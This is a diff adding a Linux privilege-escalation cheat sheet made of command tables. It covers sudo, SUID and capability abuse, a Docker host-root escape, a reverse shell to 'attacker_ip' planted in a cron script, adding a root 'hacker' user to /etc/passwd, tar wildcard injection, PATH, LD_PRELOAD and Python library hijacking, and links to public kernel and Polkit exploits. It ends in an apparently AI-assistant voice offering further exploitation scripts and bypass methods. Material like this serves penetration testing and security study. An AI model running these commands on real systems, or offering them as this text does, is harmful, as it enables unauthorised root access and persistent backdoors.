@@ -1,0 +1,140 @@
+### 🔴 Linux Privilege Escalation Cheat Sheet
+
+#### **1️⃣ Abusing Sudo Rights**
+| Technique | Command |
+|-----------|---------|
+| List sudo privileges | `sudo -l` |
+| Run command as root | `sudo -u root <command>` |
+| Exploit NOPASSWD | `sudo <command>` (if NOPASSWD is enabled) |
+
+---
+
+#### **2️⃣ SUID Binaries**
+| Technique | Command |
+|-----------|---------|
+| Find all SUID binaries | `find / -perm -u+s -type f 2>/dev/null` |
+| Exploit known SUID binaries | [GTFOBins](https://gtfobins.github.io/) |
+
+---
+
+#### **3️⃣ Capabilities**
+| Technique | Command |
+|-----------|---------|
+| Check file capabilities | `getcap -r / 2>/dev/null` |
+| Exploit capabilities | Use GTFOBins for binaries with `cap_setuid+ep` |
+
+---
+
+#### **4️⃣ Container Escapes**
+| Technique | Command |
+|-----------|---------|
+| **LXD Privilege Escalation** | `id && lxc list` |
+| **Docker Privilege Escalation** | `docker images && docker run -v /:/mnt -it <image> /bin/sh` |
+
+---
+
+#### **5️⃣ Exploiting Cron Jobs**
+| Technique | Command |
+|-----------|---------|
+| List scheduled cron jobs | `cat /etc/crontab` |
+| Check cron job permissions | `ls -lah /etc/cron*` |
+| Modify writable cron jobs | `echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /path/to/cron.sh` |
+
+---
+
+#### **6️⃣ Writable `/etc/passwd` File**
+| Technique | Command |
+|-----------|---------|
+| Check if `/etc/passwd` is writable | `ls -lah /etc/passwd` |
+| Add a new root user | `echo 'hacker:$6$xyz...:0:0::/root:/bin/bash' >> /etc/passwd` |
+
+---
+
+#### **7️⃣ Misconfigured NFS**
+| Technique | Command |
+|-----------|---------|
+| Check mounted NFS shares | `showmount -e <target>` |
+| Exploit writable NFS share | Mount and create an SUID shell |
+
+---
+
+#### **8️⃣ Exploiting Wildcard in Tar, Rsync**
+| Technique | Command |
+|-----------|---------|
+| Abusing wildcard in `tar` | `echo "echo 'hacked' > /tmp/hack" > --checkpoint=1 --checkpoint-action=exec=sh` |
+| Exploit Rsync wildcard | `rsync -aR --files-from=files.txt / root@target:/root/` |
+
+---
+
+#### **9️⃣ LD_PRELOAD Privilege Escalation**
+| Technique | Command |
+|-----------|---------|
+| Compile malicious `.so` file | `gcc -shared -o /tmp/libhax.so -fPIC hax.c` |
+| Execute with LD_PRELOAD | `LD_PRELOAD=/tmp/libhax.so /usr/bin/some_binary` |
+
+---
+
+#### **🔟 Exploiting `$PATH` Misconfiguration**
+| Technique | Command |
+|-----------|---------|
+| Check writable directories in PATH | `echo $PATH` |
+| Hijack a command execution | `echo -e '#!/bin/bash\n/bin/bash' > /tmp/fake-ls && chmod +x /tmp/fake-ls && export PATH=/tmp:$PATH` |
+
+---
+
+#### **1️⃣1️⃣ Python Library Hijacking**
+| Technique | Command |
+|-----------|---------|
+| Find misconfigured Python packages | `python -c "import sys; print(sys.path)"` |
+| Inject malicious Python script | `echo 'import os; os.system("/bin/bash")' > /usr/lib/pythonX.X/site-packages/pwn.py` |
+
+---
+
+#### **1️⃣2️⃣ Kernel Exploits**
+| Technique | Command |
+|-----------|---------|
+| Check kernel version | `uname -a` |
+| Use exploit suggester | `linux-exploit-suggester.sh` |
+
+---
+
+#### **1️⃣3️⃣ Polkit & PwnKit (CVE-2021-3560, CVE-2021-4034)**
+| Technique | Command |
+|-----------|---------|
+| Check Polkit version | `pkexec --version` |
+| Exploit Polkit (CVE-2021-3560) | [GitHub Exploit](https://github.com/berdav/CVE-2021-3560) |
+| Exploit PwnKit (CVE-2021-4034) | `./pwnkit-exploit` |
+
+---
+
+#### **1️⃣4️⃣ DirtyPipe (CVE-2022-0847)**
+| Technique | Command |
+|-----------|---------|
+| Check kernel version | `uname -r` |
+| Exploit DirtyPipe | [GitHub Exploit](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploit) |
+
+---
+
+### **🔍 Finding Root-Accessible Files**
+| Type | Command |
+|------|---------|
+| Find writable files | `find / -user root -writable 2>/dev/null | grep -v '/tmp\|/sys\|/lib\|/proc\|/dev\|/run\|/snap'` |
+| Find executable files | `find / -user root -executable 2>/dev/null | grep -v '/tmp\|/sys\|/lib\|/proc\|/dev\|/run\|/snap'` |
+| Find readable files | `find / -user root -readable 2>/dev/null | grep -v '/tmp\|/sys\|/lib\|/proc\|/dev\|/run\|/snap'` |
+
+---
+
+### **🔍 System Enumeration**
+| Information | Command |
+|------------|---------|
+| Check kernel info | `uname -a` |
+| Check running processes | `ps -ef --forest` |
+| Check network state | `netstat -tulnp` |
+| Check `/opt` for third-party software | `ls -lah /opt` |
+| Check missing PATH variables | `echo $PATH` |
+| Check user groups | `groups` |
+
+---
+
+This **cheat sheet** covers the most common **privilege escalation techniques** in **Linux**. 🚀 Let me know if you need specific **exploitation scripts** or **bypass methods**! 💻🔥
+
